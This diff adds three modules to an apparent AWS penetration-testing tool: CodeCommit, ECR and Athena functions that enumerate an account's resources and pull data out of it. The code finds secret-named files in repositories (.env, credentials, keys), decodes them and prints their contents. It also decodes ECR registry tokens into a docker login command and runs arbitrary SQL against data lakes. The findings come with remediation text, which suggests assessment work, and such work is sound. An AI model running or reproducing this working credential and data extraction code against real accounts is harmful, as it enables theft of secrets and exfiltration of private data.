@@ -740,3 +740,329 @@ export async function cleanupAws(args: string[], timeout: number): Promise<HookR
   output.push(`\n[*] Cleanup ${mode} complete`)
   return { output: output.join("\n"), findings: [] }
 }
+
+export async function codecommitDump(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const repoName = argVal(args, "--repo")
+  const branch = argVal(args, "--branch")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] CodeCommit Repository Dump\n"]
+
+  const repos = await aws(["codecommit", "list-repositories", "--query", "repositories[].[repositoryName,repositoryId]"], profile, region, timeout)
+  if (repos.exitCode !== 0) return { output: output.join("\n") + "\n[-] Access denied: codecommit:ListRepositories", findings }
+
+  const rl = tryJson(repos.stdout) || []
+  output.push(`[+] Repositories: ${rl.length}`)
+
+  const targets = repoName ? rl.filter((r: string[]) => r[0] === repoName) : rl
+
+  for (const r of targets) {
+    const name = r[0]
+    output.push(`\n  Repository: ${name}`)
+
+    const meta = await aws(["codecommit", "get-repository", "--repository-name", name, "--query", "repositoryMetadata.{defaultBranch:defaultBranch,cloneUrl:cloneUrlHttp,lastModified:lastModifiedDate,description:repositoryDescription}"], profile, region, timeout)
+    if (meta.exitCode === 0) {
+      const m = tryJson(meta.stdout)
+      if (m) {
+        output.push(`    Default branch: ${m.defaultBranch || "N/A"}`)
+        output.push(`    Clone URL: ${m.cloneUrl}`)
+        output.push(`    Last modified: ${m.lastModified}`)
+        if (m.description) output.push(`    Description: ${m.description}`)
+      }
+    }
+
+    const branches = await aws(["codecommit", "list-branches", "--repository-name", name, "--query", "branches"], profile, region, timeout)
+    if (branches.exitCode === 0) {
+      const bl = tryJson(branches.stdout) || []
+      output.push(`    Branches: ${bl.join(", ")}`)
+    }
+
+    const targetBranch = branch || tryJson((await aws(["codecommit", "get-repository", "--repository-name", name, "--query", "repositoryMetadata.defaultBranch"], profile, region, timeout)).stdout)
+    if (targetBranch) {
+      const folderContent = await aws(["codecommit", "get-folder", "--repository-name", name, "--folder-path", "/", "--query", "{files:files[].relativePath,subFolders:subFolders[].relativePath}"], profile, region, timeout)
+      if (folderContent.exitCode === 0) {
+        const fc = tryJson(folderContent.stdout)
+        if (fc) {
+          output.push(`    Root files: ${(fc.files || []).join(", ")}`)
+          output.push(`    Directories: ${(fc.subFolders || []).join(", ")}`)
+
+          const secretFiles = [".env", ".env.production", "config.json", "secrets.json", "credentials", ".aws/credentials", "docker-compose.yml", "terraform.tfvars", "*.pem", "*.key"]
+          const foundSecrets = (fc.files || []).filter((f: string) =>
+            secretFiles.some(s => f.toLowerCase().includes(s.replace("*.", ".")) || f.toLowerCase() === s)
+          )
+          if (foundSecrets.length) {
+            output.push(`    [!] Potential secret files: ${foundSecrets.join(", ")}`)
+            for (const sf of foundSecrets) {
+              const content = await aws(["codecommit", "get-file", "--repository-name", name, "--file-path", sf, "--query", "fileContent"], profile, region, timeout)
+              if (content.exitCode === 0) {
+                const decoded = Buffer.from(tryJson(content.stdout) || "", "base64").toString()
+                output.push(`\n    --- ${sf} ---`)
+                output.push(`    ${decoded.slice(0, 500)}`)
+                if (decoded.length > 500) output.push(`    ... (${decoded.length} bytes total)`)
+                findings.push({
+                  checkId: "AWS-EXFIL-005",
+                  provider: "aws",
+                  severity: "critical",
+                  status: "EXTRACTED",
+                  resource: `codecommit:${name}:${sf}`,
+                  title: `Secret file extracted from repo: ${name}/${sf}`,
+                  details: `File content: ${decoded.slice(0, 80)}...`,
+                  remediation: "Rotate all credentials in file, remove from repository, add to .gitignore",
+                })
+              }
+            }
+          }
+        }
+      }
+
+      output.push(`\n    [*] Clone command: git clone ${tryJson((await aws(["codecommit", "get-repository", "--repository-name", name, "--query", "repositoryMetadata.cloneUrlHttp"], profile, region, timeout)).stdout) || name}`)
+
+      findings.push({
+        checkId: "AWS-EXFIL-006",
+        provider: "aws",
+        severity: "high",
+        status: "ACCESSIBLE",
+        resource: `codecommit:${name}`,
+        title: `CodeCommit repository accessible: ${name}`,
+        details: "Repository can be cloned — source code may contain hardcoded secrets, business logic, internal APIs",
+        remediation: "Restrict codecommit:GitPull and codecommit:GetFile permissions",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function ecrDump(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const repoName = argVal(args, "--repository")
+  const pullImage = hasFlag(args, "--pull")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] ECR Container Image Dump\n"]
+
+  const repos = await aws(["ecr", "describe-repositories", "--query", "repositories[].[repositoryName,repositoryUri,repositoryArn,imageScanningConfiguration.scanOnPush,imageTagMutability]"], profile, region, timeout)
+  if (repos.exitCode !== 0) return { output: output.join("\n") + "\n[-] Access denied: ecr:DescribeRepositories", findings }
+
+  const rl = tryJson(repos.stdout) || []
+  output.push(`[+] ECR Repositories: ${rl.length}`)
+
+  const targets = repoName ? rl.filter((r: string[]) => r[0] === repoName) : rl
+
+  for (const r of targets) {
+    const name = r[0]
+    output.push(`\n  Repository: ${name}`)
+    output.push(`    URI: ${r[1]}`)
+    output.push(`    Scan on push: ${r[3]}  Tag mutability: ${r[4]}`)
+
+    const policy = await aws(["ecr", "get-repository-policy", "--repository-name", name, "--query", "policyText"], profile, region, timeout)
+    if (policy.exitCode === 0) {
+      const p = tryJson(policy.stdout)
+      const pStr = typeof p === "string" ? p : JSON.stringify(p)
+      if (pStr.includes('"*"') || pStr.includes('"AWS":"*"')) {
+        output.push(`    [!] Repository policy allows public access`)
+        findings.push({
+          checkId: "AWS-EXFIL-007",
+          provider: "aws",
+          severity: "high",
+          status: "OPEN",
+          resource: `ecr:${name}`,
+          title: `ECR repo with public access policy: ${name}`,
+          details: "Repository policy allows cross-account or public image pull",
+          remediation: "Restrict ECR repository policy",
+        })
+      }
+    }
+
+    const images = await aws(["ecr", "describe-images", "--repository-name", name, "--query", "imageDetails | sort_by(@, &imagePushedAt) | reverse(@) | [0:10].[{tags:imageTags,digest:imageDigest,size:imageSizeInBytes,pushed:imagePushedAt,vulns:imageScanFindingsSummary.findingSeverityCounts}]"], profile, region, timeout)
+    if (images.exitCode === 0) {
+      const il = tryJson(images.stdout) || []
+      output.push(`    Images (latest 10):`)
+      for (const img of il) {
+        const i = img[0] || img
+        const sizeMB = Math.round((i.size || 0) / 1024 / 1024)
+        const tags = (i.tags || []).join(", ") || "untagged"
+        output.push(`      ${tags}  Size: ${sizeMB}MB  Pushed: ${i.pushed}`)
+        if (i.vulns) {
+          output.push(`        Vulns: Critical=${i.vulns.CRITICAL || 0} High=${i.vulns.HIGH || 0} Medium=${i.vulns.MEDIUM || 0}`)
+        }
+      }
+    }
+
+    const lifecycle = await aws(["ecr", "get-lifecycle-policy", "--repository-name", name, "--query", "lifecyclePolicyText"], profile, region, timeout)
+    if (lifecycle.exitCode === 0) {
+      output.push(`    Lifecycle policy: configured`)
+    }
+
+    findings.push({
+      checkId: "AWS-EXFIL-008",
+      provider: "aws",
+      severity: "high",
+      status: "ACCESSIBLE",
+      resource: `ecr:${name}`,
+      title: `ECR repository accessible: ${name}`,
+      details: `URI: ${r[1]} — images may contain embedded secrets, API keys, service credentials in env vars or config files`,
+      remediation: "Restrict ecr:GetAuthorizationToken and ecr:BatchGetImage permissions",
+    })
+  }
+
+  if (pullImage && repoName) {
+    const token = await aws(["ecr", "get-authorization-token", "--query", "authorizationData[0].{token:authorizationToken,endpoint:proxyEndpoint}"], profile, region, timeout)
+    if (token.exitCode === 0) {
+      const t = tryJson(token.stdout)
+      if (t) {
+        const decoded = Buffer.from(t.token, "base64").toString()
+        const parts = decoded.split(":")
+        output.push(`\n[+] ECR Auth for pull:`)
+        output.push(`    docker login -u ${parts[0]} -p ${parts[1]?.slice(0, 20)}... ${t.endpoint}`)
+        output.push(`    docker pull ${targets[0]?.[1]}:latest`)
+      }
+    }
+  } else {
+    output.push(`\n[*] Use --repository NAME --pull to get auth token for image pull`)
+  }
+
+  const publicRepos = await aws(["ecr-public", "describe-repositories", "--query", "repositories[].[repositoryName,repositoryUri]"], profile, region, timeout)
+  if (publicRepos.exitCode === 0) {
+    const prl = tryJson(publicRepos.stdout) || []
+    if (prl.length) {
+      output.push(`\n[+] Public ECR Repositories: ${prl.length}`)
+      for (const pr of prl) output.push(`  ${pr[0]}  URI: ${pr[1]}`)
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function athenaQuery(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const query = argVal(args, "--query-string")
+  const database = argVal(args, "--database")
+  const outputBucket = argVal(args, "--output-bucket")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Athena Data Lake Query\n"]
+
+  const catalogs = await aws(["athena", "list-data-catalogs", "--query", "DataCatalogsSummary[].[CatalogName,Type]"], profile, region, timeout)
+  if (catalogs.exitCode !== 0) return { output: output.join("\n") + "\n[-] Access denied: athena:ListDataCatalogs", findings }
+
+  const cl = tryJson(catalogs.stdout) || []
+  output.push(`[+] Data catalogs: ${cl.length}`)
+  for (const c of cl) output.push(`  ${c[0]}  Type: ${c[1]}`)
+
+  const databases = await aws(["athena", "list-databases", "--catalog-name", "AwsDataCatalog", "--query", "DatabaseList[].[Name,Description]"], profile, region, timeout)
+  if (databases.exitCode === 0) {
+    const dl = tryJson(databases.stdout) || []
+    output.push(`\n[+] Databases (Glue catalog): ${dl.length}`)
+    for (const d of dl) {
+      output.push(`  ${d[0]}${d[1] ? ` — ${d[1]}` : ""}`)
+
+      const tables = await aws(["athena", "list-table-metadata", "--catalog-name", "AwsDataCatalog", "--database-name", d[0], "--query", "TableMetadataList[].[Name,TableType,Columns | length(@)]"], profile, region, timeout)
+      if (tables.exitCode === 0) {
+        const tl = tryJson(tables.stdout) || []
+        for (const t of tl) output.push(`    Table: ${t[0]}  Type: ${t[1]}  Columns: ${t[2]}`)
+      }
+    }
+  }
+
+  const workgroups = await aws(["athena", "list-work-groups", "--query", "WorkGroups[].[Name,State,EngineVersion.EffectiveEngineVersion]"], profile, region, timeout)
+  if (workgroups.exitCode === 0) {
+    const wl = tryJson(workgroups.stdout) || []
+    output.push(`\n[+] Workgroups: ${wl.length}`)
+    for (const w of wl) {
+      output.push(`  ${w[0]}  State: ${w[1]}  Engine: ${w[2]}`)
+
+      const wgDetail = await aws(["athena", "get-work-group", "--work-group", w[0], "--query", "WorkGroup.Configuration.ResultConfiguration.OutputLocation"], profile, region, timeout)
+      if (wgDetail.exitCode === 0) {
+        const loc = tryJson(wgDetail.stdout)
+        if (loc) output.push(`    Output: ${loc}`)
+      }
+    }
+  }
+
+  const recent = await aws(["athena", "list-query-executions", "--work-group", "primary", "--query", "QueryExecutionIds[0:5]"], profile, region, timeout)
+  if (recent.exitCode === 0) {
+    const ids = tryJson(recent.stdout) || []
+    if (ids.length) {
+      output.push(`\n[+] Recent queries:`)
+      for (const id of ids) {
+        const detail = await aws(["athena", "get-query-execution", "--query-execution-id", id, "--query", "QueryExecution.{query:Query,status:Status.State,submitted:Status.SubmissionDateTime,output:ResultConfiguration.OutputLocation}"], profile, region, timeout)
+        if (detail.exitCode === 0) {
+          const d = tryJson(detail.stdout)
+          if (d) {
+            output.push(`  [${d.status}] ${String(d.query).slice(0, 100)}`)
+            if (d.output) output.push(`    Output: ${d.output}`)
+          }
+        }
+      }
+    }
+  }
+
+  if (!query) {
+    output.push(`\n[*] Usage: awshook athena_query --query-string "SELECT * FROM db.table LIMIT 10" --database mydb`)
+    output.push(`[*] Results written to workgroup's S3 output location`)
+    findings.push({
+      checkId: "AWS-EXFIL-009",
+      provider: "aws",
+      severity: "high",
+      status: "ACCESSIBLE",
+      resource: "athena:catalog",
+      title: "Athena data catalog accessible — S3 data lake queryable",
+      details: "Can run SQL queries against S3 data via Glue catalog tables",
+      remediation: "Restrict athena:StartQueryExecution and glue:GetTable permissions",
+    })
+    return { output: output.join("\n"), findings }
+  }
+
+  const outputLoc = outputBucket ? `s3://${outputBucket}/athena-results/` : undefined
+  const execArgs = [
+    "athena", "start-query-execution",
+    "--query-string", query,
+    ...(database ? ["--query-execution-context", `Database=${database}`] : []),
+    ...(outputLoc ? ["--result-configuration", `OutputLocation=${outputLoc}`] : []),
+  ]
+
+  const exec = await aws(execArgs, profile, region, timeout)
+  if (exec.exitCode !== 0) {
+    output.push(`\n[-] Query failed: ${exec.stderr.trim()}`)
+    return { output: output.join("\n"), findings }
+  }
+
+  const execId = tryJson(exec.stdout)?.QueryExecutionId
+  output.push(`\n[+] Query submitted: ${execId}`)
+
+  let queryStatus = "RUNNING"
+  for (let i = 0; i < 30 && (queryStatus === "RUNNING" || queryStatus === "QUEUED"); i++) {
+    await new Promise(r => setTimeout(r, 2000))
+    const check = await aws(["athena", "get-query-execution", "--query-execution-id", execId, "--query", "QueryExecution.Status.State"], profile, region, timeout)
+    queryStatus = tryJson(check.stdout) || "UNKNOWN"
+  }
+
+  if (queryStatus === "SUCCEEDED") {
+    const results = await aws(["athena", "get-query-results", "--query-execution-id", execId, "--max-items", "20"], profile, region, timeout)
+    if (results.exitCode === 0) {
+      const r = tryJson(results.stdout)
+      const rows = r?.ResultSet?.Rows || []
+      output.push(`[+] Query succeeded — ${rows.length} rows returned:`)
+      for (const row of rows.slice(0, 20)) {
+        const vals = (row.Data || []).map((d: Record<string, string>) => d.VarCharValue || "null")
+        output.push(`  ${vals.join(" | ")}`)
+      }
+      findings.push({
+        checkId: "AWS-EXFIL-010",
+        provider: "aws",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: `athena:query:${execId}`,
+        title: `Athena query executed: ${query.slice(0, 60)}`,
+        details: `${rows.length} rows returned from data lake query`,
+        remediation: "Review athena:StartQueryExecution permissions and data access patterns",
+      })
+    }
+  } else {
+    output.push(`[-] Query status: ${queryStatus}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
